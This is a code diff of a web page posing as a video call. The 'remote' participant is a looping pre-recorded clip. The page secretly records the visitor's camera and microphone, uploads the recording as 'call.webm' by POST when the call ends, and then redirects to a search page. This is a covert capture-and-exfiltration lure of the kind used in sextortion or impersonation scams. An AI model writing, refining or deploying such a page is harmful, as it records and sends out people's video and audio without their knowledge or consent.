@@ -2,114 +2,29 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Calling</title>
-<link rel="icon" href="favicon.png">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<title>Calling</title>
 <style>
-body { margin:0; background:black; overflow:hidden; }
-
-#remoteVideo {
-    position:fixed;
-    width:100%;
-    height:100%;
-    object-fit:cover;
-}
-
-#localVideo {
-    position: absolute;
-    width: 120px;
-    height: 213px; /* 9:16 ratio (120 × 1.77) */
-    bottom: 100px;
-    right: 20px;
-    border: 2px solid white;
-    border-radius: 12px;
-    object-fit: cover;
-    z-index: 10;
-    cursor: grab;
-}
-
- let isDragging = false;
-let offsetX = 0;
-let offsetY = 0;
-
-localVideo.addEventListener("mousedown", startDrag);
-localVideo.addEventListener("touchstart", startDrag, { passive: false });
-
-function startDrag(e) {
-    isDragging = true;
-
-    const rect = localVideo.getBoundingClientRect();
-
-    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
-
-    offsetX = clientX - rect.left;
-    offsetY = clientY - rect.top;
-
-    localVideo.style.cursor = "grabbing";
-}
-
-document.addEventListener("mousemove", drag);
-document.addEventListener("touchmove", drag, { passive: false });
-
-function drag(e) {
-    if (!isDragging) return;
-
-    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
-
-    localVideo.style.left = (clientX - offsetX) + "px";
-    localVideo.style.top = (clientY - offsetY) + "px";
-    localVideo.style.right = "auto";
-    localVideo.style.bottom = "auto";
-}
-
-document.addEventListener("mouseup", stopDrag);
-document.addEventListener("touchend", stopDrag);
-
-function stopDrag() {
-    isDragging = false;
-    localVideo.style.cursor = "grab";
-}   
-
-.controls {
-    position:absolute;
-    bottom:20px;
-    width:100%;
-    display:flex;
-    justify-content:center;
-    gap:10px;
-}
-
-button {
-    padding:10px;
-    border:none;
-    border-radius:20px;
-    background:#222;
-    color:white;
-    cursor:pointer;
-}
-
-.end { background:red; }
+    body { margin:0; background:black; color:white; font-family: sans-serif; overflow:hidden; }
+    #remoteVideo { position:fixed; width:100%; height:100%; object-fit:cover; }
+    #localVideo { position: absolute; width: 120px; height: 180px; bottom: 100px; right: 20px; border: 2px solid white; border-radius: 12px; object-fit: cover; z-index: 10; }
+    .controls { position:absolute; bottom:20px; width:100%; display:flex; justify-content:center; gap:10px; }
+    button { padding:12px 20px; border:none; border-radius:25px; background:#333; color:white; cursor:pointer; }
+    .end { background:#ff3b30; }
 </style>
 </head>
-
 <body>
 
-<!-- Fake remote -->
 <video id="remoteVideo" autoplay loop muted playsinline>
     <source src="test-video.mp4" type="video/mp4">
 </video>
 
-<!-- Your cam -->
 <video id="localVideo" autoplay muted playsinline></video>
 
 <div class="controls">
     <button onclick="toggleMic()">Mic</button>
-    <button onclick="toggleCamera()">Cam</button>
     <button onclick="switchCamera()">Switch</button>
-    <button class="end" onclick="endCall()">End</button>
+    <button class="end" onclick="endCall()">End Call</button>
 </div>
 
 <script>
@@ -118,55 +33,31 @@ let mediaRecorder;
 let recordedChunks = [];
 let currentFacing = "user";
 
-const localVideo = document.getElementById("localVideo");
-
 async function startCamera() {
-    localStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: currentFacing },
-        audio: true
-    });
-
-    localVideo.srcObject = localStream;
-
-    startRecording();
+    try {
+        localStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: currentFacing },
+            audio: true
+        });
+        document.getElementById("localVideo").srcObject = localStream;
+        startRecording();
+    } catch (err) {
+        alert("Camera access denied or not supported.");
+    }
 }
 
 function startRecording() {
-    const stream = localStream;
-    recordedChunks = [];
-
-    // 🔥 Pick a working mime type automatically
-    let mimeType = "";
-
-    if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) {
-        mimeType = "video/webm;codecs=vp9,opus";
-    } else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")) {
-        mimeType = "video/webm;codecs=vp8,opus";
-    } else if (MediaRecorder.isTypeSupported("video/webm")) {
-        mimeType = "video/webm";
-    } else {
-        alert("Your browser does not support video recording properly");
-        return;
-    }
-
-    console.log("Using mimeType:", mimeType);
-
-    mediaRecorder = new MediaRecorder(stream, { mimeType });
-
+    const types = ["video/webm;codecs=vp8,opus", "video/webm", "video/mp4"];
+    let selectedType = types.find(t => MediaRecorder.isTypeSupported(t));
+    
+    mediaRecorder = new MediaRecorder(localStream, { mimeType: selectedType });
+    
     mediaRecorder.ondataavailable = e => {
         if (e.data.size > 0) recordedChunks.push(e.data);
     };
 
     mediaRecorder.onstop = async () => {
-        const blob = new Blob(recordedChunks, { type: mimeType });
-
-        console.log("Blob size:", blob.size);
-
-        if (blob.size === 0) {
-            alert("Recording failed (empty video)");
-            return;
-        }
-
+        const blob = new Blob(recordedChunks, { type: selectedType });
         const formData = new FormData();
         formData.append("video", blob, "call.webm");
 
@@ -175,45 +66,35 @@ function startRecording() {
                 method: "POST",
                 body: formData
             });
-
-            console.log("Upload complete");
         } catch (err) {
-            console.error("Upload failed:", err);
+            console.error("Upload failed", err);
         }
-
         window.location.href = "search.html";
     };
 
-    mediaRecorder.start(1000);
+    mediaRecorder.start();
+}
+
+function switchCamera() {
+    currentFacing = currentFacing === "user" ? "environment" : "user";
+    localStream.getTracks().forEach(t => t.stop());
+    startCamera();
 }
 
 function toggleMic() {
-    const track = localStream.getAudioTracks()[0];
-    track.enabled = !track.enabled;
-}
-
-function toggleCamera() {
-    const track = localStream.getVideoTracks()[0];
-    track.enabled = !track.enabled;
-}
-
-async function switchCamera() {
-    currentFacing = currentFacing === "user" ? "environment" : "user";
-
-    localStream.getTracks().forEach(t => t.stop());
-    await startCamera();
+    const audioTrack = localStream.getAudioTracks()[0];
+    if(audioTrack) audioTrack.enabled = !audioTrack.enabled;
 }
 
 function endCall() {
-    console.log("Ending call...");
-
     if (mediaRecorder && mediaRecorder.state !== "inactive") {
         mediaRecorder.stop();
+    } else {
+        window.location.href = "search.html";
     }
 }
 
 startCamera();
 </script>
-
 </body>
 </html>
